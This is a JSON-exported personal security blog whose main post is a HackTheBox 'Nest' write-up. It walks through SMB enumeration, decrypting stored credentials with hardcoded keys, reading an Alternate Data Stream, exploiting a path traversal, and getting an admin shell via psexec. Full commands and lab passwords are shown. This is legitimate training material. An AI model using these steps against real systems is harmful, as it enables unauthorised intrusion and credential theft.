[{"content":"Hello, ma friend! I love to learn and discover the unknown, specially about security stuff. That\u0026rsquo;s why I try to touch a little bit of everything such Web application, Cr1pt0 or even b1nar1 explo1tat10n. Doing CTFs is an addicition but I like to research some real world apps too.\nI decided to write this blog to share with the community my work and also improve my reporting/documentation skills. I hope to be helpfull to you.\nSharing is caring :) (At this moment, I\u0026rsquo;m starting to write the initial stuff of the blog and hope to add cool content soon.)\nCheckout my GitHub:\nhttps://github.com/s4nkx0k/\n","description":"Hugo, the world’s fastest framework for building websites","id":2,"section":"","tags":null,"title":"About","uri":"s4nkx0k.github.io/en/about/"},{"content":"This is my first post, oh yeah!!! This opens my blog which I will share my writeups and findings. It\u0026rsquo;s a way to show the community my work and how I love to security related things.\n","description":"","id":3,"section":"posts","tags":null,"title":"First post!","uri":"s4nkx0k.github.io/en/posts/2020-12-12-first-posting/"},{"content":"This post is special because is my first writeup :)\nWe have the box named Nest, which is a Windows machine, built with literal \u0026ldquo;nested\u0026rdquo; challenges. A lot of enumeration and a little touch of .NET decompilation at the end defines this box.\nThis box was only running two services, SMB and HQK Reporting service. I started enumerating SMB and found some temporary creds which lead to a notepad++ config file with the path for a file with user credentials. Digging into the user files, there was a file with a hidden password using Alternate Data Streams. This password permitted to use the debug mode in the HQK Reporting service which, was vulnerable to a path traversal vulnerability. Combining the path traversal vuln and the debug mode, it was possible to read an LDAP configuration file with admin creds. Lastly, decompiled a .NET application that contained a function to decrypt the admin password.\nBox made entirely with Linux\nBox Info    Name Nest     OS Windows   Level Easy    Recon The nmap shows two open ports: 445 and4386.\n nmap -sC -sV -oN nmap 10.10.10.178\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  Nmap scan report for 10.10.10.178 Host is up (0.12s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServ er, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR \u0026lt;Directory_Name\u0026gt; | RUNQUERY \u0026lt;Query_ID\u0026gt; | DEBUG \u0026lt;Password\u0026gt; |_ HELP \u0026lt;Command\u0026gt; [...] Host script results: |_clock-skew: 45s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-02-08T00:03:53 |_ start_date: 2020-02-07T10:39:25   Port 445 is SMB but, 4386 was an unknown for me. Trying connecting to it with telnet, I got the following output\n1 2 3 4  Trying 10.10.10.178 Connected to 10.10.10.178    telnet 10.10.10.178 4386\n 1 2 3 4 5 6 7 8 9  Trying 10.10.10.178... Connected to 10.10.10.178. Escape character is \u0026#39;^]\u0026#39;. HQK Reporting Service V1.2 \u0026gt;   I tried to look for any relevant exploit on the internet but, nothing relevant. I will start to enumerate the SMB service.\nSMB Enumeration - Port TCP/445 Let\u0026rsquo;s start by enumerating the available shares\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  $ smbclient -L //10.10.10.178 1 ↵ Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share Data Disk IPC$ IPC Remote IPC Secure$ Disk Users Disk SMB1 disabled -- no workgroup available   There are three available shares with anonymous access and waiting to be enumerated. For these first steps, I mounted the shared with cifs. Later, I give up doing this procedure and enumerate directly with smbclient.\nI started with the Users share by doing\n $ mount -t cifs //10.10.10.178/Users /mnt/smb\n I found the following users\n1 2 3 4 5  $ ls /mnt/smb Administrator C.Smith L.Frost R.Thompson TempUser   Trying to access each one of these folders but always got access denied.\nLet\u0026rsquo;s move on to Data share and view its output. First, unmount the Users share\n $ umount /mnt/smb\n Now mount the Data share\n $ mount -t cifs //10.10.10.178/Data /mnt/smb\n Listing the smb folder\n1 2 3 4 5  $ ls /mnt/smb IT Production Reports Shared   Listing all the folders recursively\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  $ ls -laR smb/ [...] ./smb/Shared/Maintenance: total 1 drwxr-xr-x 2 root root 0 Aug 7 2019 . drwxr-xr-x 2 root root 0 Aug 7 2019 .. ./smb/Shared/Maintenance: total 1 drwxr-xr-x 2 root root 0 Aug 7 2019 . drwxr-xr-x 2 root root 0 Aug 7 2019 .. -rwxr-xr-x 1 root root 48 Aug 6 2019 \u0026#39;Maintenance Alerts.txt\u0026#39; [...] ./smb/Shared/Templates/HR: total 1 drwxr-xr-x 2 root root 0 Aug 7 2019 . drwxr-xr-x 2 root root 0 Aug 7 2019 .. -rwxr-xr-x 1 root root 425 Aug 7 2019 \u0026#39;Welcome Email.txt\u0026#39;   It outputs two interesting files, Maintenance Alerts.txt and Welcome Email.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  $ cat smb/Shared/Maintenance/Maintenance\\ Alerts.txt There is currently no scheduled maintenance work% $ cat smb/Shared/Templates/HR/Welcome\\ Email.txt We would like to extend a warm welcome to our newest member of staff, \u0026lt;FIRSTNAME\u0026gt; \u0026lt;SURNAME\u0026gt; You will find your home folder in the following location: \\\\HTB-NEST\\Users\\\u0026lt;USERNAME\u0026gt; If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you. Username: TempUser Password: welcome2019 Thank you HR   We have creds for TempUser. Let\u0026rsquo;s use them and access Data share and see what it has.\n(This is the part I give up of cifs and started to used only smbclient)\n smbclient //10.10.10.178/Data -U TempUser\n and enable when listing to list recursively with the command\n recurse on\n This results into\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122  $ smbclient //10.10.10.178/Data -U TempUser smb: \\\u0026gt; recurse on smb: \\\u0026gt; ls . D 0 Wed Aug 7 23:53:46 2019 .. D 0 Wed Aug 7 23:53:46 2019 IT D 0 Wed Aug 7 23:58:07 2019 Production D 0 Mon Aug 5 22:53:38 2019 Reports D 0 Mon Aug 5 22:53:44 2019 Shared D 0 Wed Aug 7 20:07:51 2019 \\IT . D 0 Wed Aug 7 23:58:07 2019 .. D 0 Wed Aug 7 23:58:07 2019 Archive D 0 Mon Aug 5 23:33:58 2019 Configs D 0 Wed Aug 7 23:59:34 2019 Installs D 0 Wed Aug 7 23:08:30 2019 Reports D 0 Sun Jan 26 00:09:13 2020 Tools D 0 Mon Aug 5 23:33:43 2019 \\Production . D 0 Mon Aug 5 22:53:38 2019 .. D 0 Mon Aug 5 22:53:38 2019 \\Reports . D 0 Mon Aug 5 22:53:44 2019 .. D 0 Mon Aug 5 22:53:44 2019 \\Shared . D 0 Wed Aug 7 20:07:51 2019 .. D 0 Wed Aug 7 20:07:51 2019 Maintenance D 0 Wed Aug 7 20:07:32 2019 Templates D 0 Wed Aug 7 20:08:07 2019 \\IT\\Archive . D 0 Mon Aug 5 23:33:58 2019 .. D 0 Mon Aug 5 23:33:58 2019 \\IT\\Configs . D 0 Wed Aug 7 23:59:34 2019 .. D 0 Wed Aug 7 23:59:34 2019 Adobe D 0 Wed Aug 7 20:20:09 2019 Atlas D 0 Tue Aug 6 12:16:18 2019 DLink D 0 Tue Aug 6 14:25:27 2019 Microsoft D 0 Wed Aug 7 20:23:26 2019 NotepadPlusPlus D 0 Wed Aug 7 20:31:37 2019 RU Scanner D 0 Wed Aug 7 21:01:13 2019 Server Manager D 0 Tue Aug 6 14:25:19 2019 \\IT\\Installs . D 0 Wed Aug 7 23:08:30 2019 .. D 0 Wed Aug 7 23:08:30 2019 \\IT\\Reports . D 0 Sun Jan 26 00:09:13 2020 .. D 0 Sun Jan 26 00:09:13 2020 \\IT\\Tools . D 0 Mon Aug 5 23:33:43 2019 .. D 0 Mon Aug 5 23:33:43 2019 \\Shared\\Maintenance . D 0 Wed Aug 7 20:07:32 2019 .. D 0 Wed Aug 7 20:07:32 2019 Maintenance Alerts.txt A 48 Tue Aug 6 00:01:44 2019 \\Shared\\Templates . D 0 Wed Aug 7 20:08:07 2019 .. D 0 Wed Aug 7 20:08:07 2019 HR D 0 Wed Aug 7 20:08:01 2019 Marketing D 0 Wed Aug 7 20:08:06 2019 \\IT\\Configs\\Adobe . D 0 Wed Aug 7 20:20:09 2019 .. D 0 Wed Aug 7 20:20:09 2019 editing.xml AH 246 Sat Aug 3 13:58:42 2019 Options.txt A 0 Mon Oct 10 22:11:14 2011 projects.xml A 258 Tue Jan 8 16:30:52 2013 settings.xml A 1274 Wed Aug 7 20:19:12 2019 \\IT\\Configs\\Atlas . D 0 Tue Aug 6 12:16:18 2019 .. D 0 Tue Aug 6 12:16:18 2019 Temp.XML A 1369 Wed Jun 11 08:38:22 2003 \\IT\\Configs\\DLink . D 0 Tue Aug 6 14:25:27 2019 .. D 0 Tue Aug 6 14:25:27 2019 \\IT\\Configs\\Microsoft . D 0 Wed Aug 7 20:23:26 2019 .. D 0 Wed Aug 7 20:23:26 2019 Options.xml A 4598 Sat Mar 3 19:24:24 2012 \\IT\\Configs\\NotepadPlusPlus . D 0 Wed Aug 7 20:31:37 2019 .. D 0 Wed Aug 7 20:31:37 2019 config.xml A 6451 Thu Aug 8 00:01:25 2019 shortcuts.xml A 2108 Wed Aug 7 20:30:27 2019 \\IT\\Configs\\RU Scanner . D 0 Wed Aug 7 21:01:13 2019 .. D 0 Wed Aug 7 21:01:13 2019 RU_config.xml A 270 Thu Aug 8 20:49:37 2019 \\IT\\Configs\\Server Manager . D 0 Tue Aug 6 14:25:19 2019 .. D 0 Tue Aug 6 14:25:19 2019 \\Shared\\Templates\\HR . D 0 Wed Aug 7 20:08:01 2019 .. D 0 Wed Aug 7 20:08:01 2019 Welcome Email.txt A 425 Wed Aug 7 23:55:36 2019 \\Shared\\Templates\\Marketing . D 0 Wed Aug 7 20:08:06 2019 .. D 0 Wed Aug 7 20:08:06 2019 10485247 blocks of size 4096. 6543435 blocks available   Now the IT folders is accessible. I dumped all the share files to my local machine to be easier to look for clues.\n smbclient -Tc allfiles.tar /htb/nest/smb; tar xf /htb/nest/smb/allfiles.tar\n Examining each one of these files content, two of them have interesting information. The files are:\n Data/IT/Configs/RU Scanner/RU_Config.xml\n 1 2 3 4 5 6  \u0026lt;History nbMaxFile=\u0026#34;15\u0026#34; inSubMenu=\u0026#34;no\u0026#34; customLength=\u0026#34;-1\u0026#34;\u0026gt; \u0026lt;File filename=\u0026#34;C:\\windows\\System32\\drivers\\etc\\hosts\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;C:\\Users\\C.Smith\\Desktop\\todo.txt\u0026#34; /\u0026gt; \u0026lt;/History\u0026gt;   This tells someone was accessing C.Smith files as well as files on the Secure$ share. The other file is\n Data/IT/Configs/NotepadPlusPlus/config.xml\n 1 2 3 4 5 6 7  \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ConfigFile xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;389\u0026lt;/Port\u0026gt; \u0026lt;Username\u0026gt;c.smith\u0026lt;/Username\u0026gt; \u0026lt;Password\u0026gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026lt;/Password\u0026gt; \u0026lt;/ConfigFile\u0026gt;   The password C. Smith user looks it is encoded in base64. Trying to access User share with the decoded password the result is\n1 2 3 4 5  $ smbclient //10.10.10.178/Users -U c.smith Enter WORKGROUP\\c.smith\u0026#39;s password: session setup failed: NT_STATUS_LOGON_FAILURE   Failed authentication. This password must be encrypted and encoded in base64.\nCracking C. Smith password We can\u0026rsquo;t explore the C. Smith user files and for the content of todo.txt. Let\u0026rsquo;s try to access the Secure$ share with TempUser user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  $ smbclient //10.10.10.178/Secure$ -U TempUser Enter WORKGROUP\\TempUser\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; recurse on smb: \\\u0026gt; ls . D 0 Thu Aug 8 00:08:12 2019 .. D 0 Thu Aug 8 00:08:12 2019 Finance D 0 Wed Aug 7 20:40:13 2019 HR D 0 Thu Aug 8 00:08:11 2019 IT D 0 Thu Aug 8 11:59:25 2019 \\Finance NT_STATUS_ACCESS_DENIED listing \\Finance\\* \\HR NT_STATUS_ACCESS_DENIED listing \\HR\\* \\IT NT_STATUS_ACCESS_DENIED listing \\IT\\*   We have an odd situation here. TempUser has access to the Secret$ share but can\u0026rsquo;t list any of the directories. But RU_Config.xml file shows access to a file inside the IT directory. I tried to put the complete path to the Temp.txt file and read it but got an error. Then, tried to list IT\\Carl directory\n1 2 3 4 5 6 7 8 9 10 11  $ smb: \\\u0026gt; ls IT\\Carl\\  . D 0 Wed Aug 7 20:42:14 2019 .. D 0 Wed Aug 7 20:42:14 2019 Docs D 0 Wed Aug 7 20:44:00 2019 Reports D 0 Tue Aug 6 14:45:40 2019 VB Projects D 0 Tue Aug 6 15:41:55 2019 10485247 blocks of size 4096. 6543440 blocks available   Surprise, surprise!!! We can list the directories inside the IT folder. This means we have restricted permissions for the IT directory but the directories inside look like we have no restrictions.\n Note: Pay attention on how you set the permissions of your files. Having restrictions in the root/primary directories does not mean the directories inside of it have the same permissions.\n Listing the directory recursively, just the folder \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner appears to have interesting information.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  $ smb: \\\u0026gt; ls IT\\Carl\\ [...] \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner . D 0 Wed Aug 7 18:05:54 2019 .. D 0 Wed Aug 7 18:05:54 2019 bin D 0 Wed Aug 7 16:00:11 2019 ConfigFile.vb A 772 Wed Aug 7 18:05:09 2019 Module1.vb A 279 Wed Aug 7 18:05:44 2019 My Project D 0 Wed Aug 7 16:00:11 2019 obj D 0 Wed Aug 7 16:00:11 2019 RU Scanner.vbproj A 4828 Fri Aug 9 11:37:51 2019 RU Scanner.vbproj.user A 143 Tue Aug 6 08:55:27 2019 SsoIntegration.vb A 133 Wed Aug 7 18:05:58 2019 Utils.vb A 4888 Wed Aug 7 15:49:35 2019 \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\bin . D 0 Wed Aug 7 16:00:11 2019 .. D 0 Wed Aug 7 16:00:11 2019 Debug D 0 Wed Aug 7 15:59:13 2019 Release D 0 Tue Aug 6 08:55:26 2019 \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project . D 0 Wed Aug 7 16:00:11 2019 .. D 0 Wed Aug 7 16:00:11 2019 Application.Designer.vb A 441 Tue Aug 6 08:55:13 2019 Application.myapp A 481 Tue Aug 6 08:55:13 2019 AssemblyInfo.vb A 1163 Tue Aug 6 08:55:13 2019 Resources.Designer.vb A 2776 Tue Aug 6 08:55:13 2019 Resources.resx A 5612 Tue Aug 6 08:55:13 2019 Settings.Designer.vb A 2989 Tue Aug 6 08:55:13 2019 Settings.settings A 279 Tue Aug 6 08:55:13 2019 [...]   Looking to the files looks it is a Visual Basic program. From it, two files have relevant data\n Module1.vb\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14  Module Module1 Sub Main() Dim Config As ConfigFile = ConfigFile.LoadFromFile(\u0026#34;RU_Config.xml\u0026#34;) Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)} End Sub End Module    Utils.vb\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121  Imports System.Text Imports System.Security.Cryptography Public Class Utils Public Shared Function GetLogFilePath() As String Return IO.Path.Combine(Environment.CurrentDirectory, \u0026#34;Log.txt\u0026#34;) End Function Public Shared Function DecryptString(EncryptedString As String) As String If String.IsNullOrEmpty(EncryptedString) Then Return String.Empty Else Return Decrypt(EncryptedString, \u0026#34;N3st22\u0026#34;, \u0026#34;88552299\u0026#34;, 2, \u0026#34;464R5DFA5DL6LE28\u0026#34;, 256) End If End Function Public Shared Function EncryptString(PlainString As String) As String If String.IsNullOrEmpty(PlainString) Then Return String.Empty Else Return Encrypt(PlainString, \u0026#34;N3st22\u0026#34;, \u0026#34;88552299\u0026#34;, 2, \u0026#34;464R5DFA5DL6LE28\u0026#34;, 256) End If End Function Public Shared Function Encrypt(ByVal plainText As String, _ ByVal passPhrase As String, _ ByVal saltValue As String, _ ByVal passwordIterations As Integer, _ ByVal initVector As String, _ ByVal keySize As Integer) _ As String Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector) Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue) Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText) Dim password As New Rfc2898DeriveBytes(passPhrase, _ saltValueBytes, _ passwordIterations) Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8)) Dim symmetricKey As New System.Security.Cryptography.RijndaelManaged symmetricKey.Mode = CipherMode.CBC Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes) Using memoryStream As New IO.MemoryStream() Using cryptoStream As New CryptoStream(memoryStream, _ encryptor, _ CryptoStreamMode.Write) cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length) cryptoStream.FlushFinalBlock() Dim cipherTextBytes As Byte() = memoryStream.ToArray() memoryStream.Close() cryptoStream.Close() Return Convert.ToBase64String(cipherTextBytes) End Using End Using End Function Public Shared Function Decrypt(ByVal cipherText As String, _ ByVal passPhrase As String, _ ByVal saltValue As String, _ ByVal passwordIterations As Integer, _ ByVal initVector As String, _ ByVal keySize As Integer) _ As String Dim initVectorBytes As Byte() initVectorBytes = Encoding.ASCII.GetBytes(initVector) Dim saltValueBytes As Byte() saltValueBytes = Encoding.ASCII.GetBytes(saltValue) Dim cipherTextBytes As Byte() cipherTextBytes = Convert.FromBase64String(cipherText) Dim password As New Rfc2898DeriveBytes(passPhrase, _ saltValueBytes, _ passwordIterations) Dim keyBytes As Byte() keyBytes = password.GetBytes(CInt(keySize / 8)) Dim symmetricKey As New System.Security.Cryptography.RijndaelManaged symmetricKey.Mode = CipherMode.CBC Dim decryptor As ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes) Dim memoryStream As IO.MemoryStream memoryStream = New IO.MemoryStream(cipherTextBytes) Dim cryptoStream As CryptoStream cryptoStream = New CryptoStream(memoryStream, _ decryptor, _ CryptoStreamMode.Read) Dim plainTextBytes As Byte() ReDim plainTextBytes(cipherTextBytes.Length) Dim decryptedByteCount As Integer decryptedByteCount = cryptoStream.Read(plainTextBytes, _ 0, _ plainTextBytes.Length) memoryStream.Close() cryptoStream.Close() Dim plainText As String plainText = Encoding.ASCII.GetString(plainTextBytes, _ 0, _ decryptedByteCount) Return plainText End Function End Class   This code has functions to encrypt and decrypt strings that we can use to decrypt C. Smith's password. I just need to change\nModule1.vb a little bit. BTW, I used dotnetfiddle to execute the code.\n1 2 3 4  Sub Main() Console.WriteLine(Dim test As New SsoIntegration With {.Username = \u0026#34;c.smith\u0026#34;, .Password = Utils.DecryptString(\u0026#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026#34;)}) End Sub   Notice I add code to print it in the console C. Smith's credentials. After executing it, the script outputs the following plaintext password\n xRxRxPANCAK3SxRxRx\n Get The User flag Accessing the User share with c. smith credentials we see the flag file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  $ recurse on $ ls [...] \\C.Smith . D 0 Sun Jan 26 07:21:44 2020 .. D 0 Sun Jan 26 07:21:44 2020 HQK Reporting D 0 Fri Aug 9 00:06:17 2019 user.txt A 32 Fri Aug 9 00:05:24 2019 [...] $ smb: \\\u0026gt; cd C.Smith\\ $ smb: \\\u0026gt; more user.txt $ smb: \\\u0026gt; ...(flag)...   Privesc to Administrator Exploring the HQK Reporting folder\n1 2 3 4 5 6 7 8 9  smb: \\C.Smith\\\u0026gt; ls \u0026#34;HQK Reporting\u0026#34;\\  . D 0 Fri Aug 9 00:06:17 2019 .. D 0 Fri Aug 9 00:06:17 2019 AD Integration Module D 0 Fri Aug 9 13:18:42 2019 Debug Mode Password.txt A 0 Fri Aug 9 00:08:17 2019 HQK_Config_Backup.xml A 249 Fri Aug 9 00:09:05 2019 10485247 blocks of size 4096. 6543424 blocks available   Looking at the output, the Debug Mode Password.txt got my attention because the HQK Reporting Service has a debug mode. I download the file to my computer but was empty. Downloaded it again but, still empty. I tried different approaches and always the same result. What the hell??? I made an all-in in this file but got nothing :(\nThen, I typed the help command to see the available commands, and there was the allinfo command. According tot he description, this command shows all available info of a file. Let\u0026rsquo;s try it with the Debug Mode Password.txt file.\n1 2 3 4 5 6 7 8 9 10 11  $ smb: \\C.Smith\\HQK Reporting\\\u0026gt; allinfo \u0026#34;Debug Mode Password.txt\u0026#34; altname: DEBUGM~1.TXT create_time: Fri Aug 9 00:06:12 2019 BST access_time: Fri Aug 9 00:06:12 2019 BST write_time: Fri Aug 9 00:08:17 2019 BST change_time: Fri Aug 9 00:08:17 2019 BST attributes: A (20) stream: [::$DATA], 0 bytes stream: [:Password:$DATA], 15 bytes   BOOM! This all makes sense now. It looks this file has Alternate Data Atreams (ADS).\n Alternate Data Streams (ADS) is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file.\n In pratical words, the file has hidden data and contains a Password stream.\n1 2 3 4 5 6 7 8 9 10 11  $ smb: \\C.Smith\\HQK Reporting\\\u0026gt; more \u0026#34;Debug Mode Password.txt:Password\u0026#34; $ WBQ201953D8w or $ smb: get \u0026#34;Debug Mode Password.txt:Password:$DATA\u0026#34; (now with the linux terminal) $ cat Debug\\ Mode\\ Password.txt:Password:\\$DATA WBQ201953D8w   Here is the debug mode password. With the debug mode enabled in HQK Reporting, it is possible to read files. I used telnet to connect to port 4386. Hereabouts is running the HQK Reporting service.\nThe command help shows the current possible commands to use. Below we can see the different options when debug mode is enabled.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  telnet 10.10.10.178 4386 Trying 10.10.10.178... Connected to 10.10.10.178. Escape character is \u0026#39;^]\u0026#39;. HQK Reporting Service V1.2 \u0026gt; help This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR \u0026lt;Directory_Name\u0026gt; RUNQUERY \u0026lt;Query_ID\u0026gt; DEBUG \u0026lt;Password\u0026gt; HELP \u0026lt;Command\u0026gt; \u0026gt;DEBUG WBQ201953D8w Debug mode enabled. Use the HELP command to view additional commands that are now available \u0026gt; help This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR \u0026lt;Directory_Name\u0026gt; RUNQUERY \u0026lt;Query_ID\u0026gt; DEBUG \u0026lt;Password\u0026gt; HELP \u0026lt;Command\u0026gt; SERVICE SESSION SHOWQUERY \u0026lt;Query_ID\u0026gt;   Also, there is a path traversal vulnerability that permits to change directories across the system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  setdir .. Current directory set to HQK \u0026gt; list Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [DIR] ALL QUERIES [DIR] LDAP [DIR] Logs [1] HqkSvc.exe [2] HqkSvc.InstallState [3] HQK_Config.xml Current Directory: HQK   Found a Ldap.conf file with admin creds\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026gt; setdir LDAP Current directory set to LDAP \u0026gt; list Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [1] HqkLdap.exe [2] Ldap.conf \u0026gt; showquery 2 Domain=nest.local Port=389 BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local User=Administrator Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=   I tried to decrypt the password with the VB script used to decrypt C. Smith's password but got a padding error. So, let\u0026rsquo;s try to decompile HqLdap.exe.\n1 2  file HqkLdap.exe HqkLdap.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows   The output shows we have a .NET application.\nPossible tools to decompile .NET exe files are:\n  ILSpy with reflexil\n  dnSpy - better version of ILSpy (thanks @ippsec) - video\n  AvalonialLSpy - cross-platform version of ILSpy built with Avalonia (used this one because was lazy to switch for a windows VM)\n  dotpeek - JetBains free .NET decompiler\n  I tried common RE tools(Ghidra or cutter) but, the analysis is difficult and a bit messy.\nLooking to the decompiled code there is a password decrypt function. This function is reading the Ldap.config file. We can see the parameters by filtering only for the string password. It is starting reading from the first character after the first equal (\u0026lsquo;='+1).\nI see this code is similar to the utils.vb script used to decrypt C. Smith's password. So, I tried a different approach and tried to change it to decrypt the administrator password.\n Maybe if I would try this step in a Windows VM this work was unnecessary but my laziness won before and now I pay for it :(\n Changing the parameters of the decrypt function according to the executable code, I assumed the code could run\nBut\u0026hellip; keeps giving the padding error so started to inspect more deeply decrypt function in the decompiled code and there is a slight modification on this line from the RD function\n byte[] array2 = new byte[array.Length + 1];\n This line says it alocates a new byte array based on the decoded ciphertext.\nIn the utils.vb script changed the following line\n Redim plainTextBytes(cipherTextBytes.Length)\n to\n ReDim plainTextBytes((cipherTextBytes.Length) + 1)\n After compiling utils.vb, still gives me the padding error. I\u0026rsquo;m starting getting crazy about this one :(\nThen, I thought. If the error is about padding if I try to remove the padding check, this could work?\nLook for the following line\n symmetricKey.Mode = CipherMode.CBC\n and add this line after it\n symmetricKey.Padding = PaddingMode.None\n And then JACKPOT finally the damn decrypt admin password is looking at me (and me to her).\n XtH4nkS4Pl4y1nGX\n Now I can be in GOD mode or Root :)\nBest Part: Getting the Root Flag We have creds so, we can simply use psexec and get a shell as root.\n /usr/share/doc/python3-impacket/examples/psexec.py Administrator@10.10.10.178\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation Password: [*] Requesting shares on 10.10.10.178..... [*] Found writable share ADMIN$ [*] Uploading file wbkVRYqo.exe [*] Opening SVCManager on 10.10.10.178..... [*] Creating service DVfG on 10.10.10.178..... [*] Starting service DVfG..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;cd \\Users\\Administrator\\Desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is 2C6F-6A14 Directory of C:\\Users\\Administrator\\Desktop 01/26/2020 08:20 AM \u0026lt;DIR\u0026gt; . 01/26/2020 08:20 AM \u0026lt;DIR\u0026gt; .. 08/05/2019 11:27 PM 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 26,801,225,728 bytes free C:\\Users\\Administrator\\Desktop\u0026gt; type root.txt C:\\Users\\Administrator\\Desktop\u0026gt; ...(root flag)...   Another way was to mout the C$ share as Administrator user.\n","description":"","id":4,"section":"posts","tags":["hackthebox","smbclient","cifs","alternate data streams","path traversal","hqk",".net","ilspy","psexec"],"title":"HTB: Nest","uri":"s4nkx0k.github.io/en/posts/2020-06-07-htb-nest-/"}]